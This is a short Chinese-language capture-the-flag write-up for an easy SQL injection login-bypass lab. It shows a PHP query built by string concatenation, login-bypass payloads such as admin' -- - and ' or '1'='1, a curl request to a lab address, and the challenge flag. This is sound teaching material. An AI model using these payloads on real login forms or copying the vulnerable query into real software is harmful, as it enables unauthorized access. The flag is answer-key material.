# WP：04-sql-injection

## 题目信息

- 类型：SQL 注入登录绕过
- 难度：Easy
- 端口：13384

## 分析

登录框将用户名和密码直接拼接到 SQL 语句中：

```php
$sql = "SELECT * FROM users WHERE username='$username' AND password='$password'";
```

admin 用户的 flag 存储在数据库里，需要以 admin 身份登录才能拿到。

## 解题

在用户名处注入 `admin' -- -`，将后面的密码条件注释掉：

```sql
SELECT * FROM users WHERE username='admin' -- -' AND password='x'
```

```bash
curl -s http://172.16.173.140:13384/ -d "username=admin' -- -&password=x"
```

其他注入方式：

```
username: admin' or '1'='1
password: admin' or '1'='1
```

## Flag

`flag{sql_injection_101}`
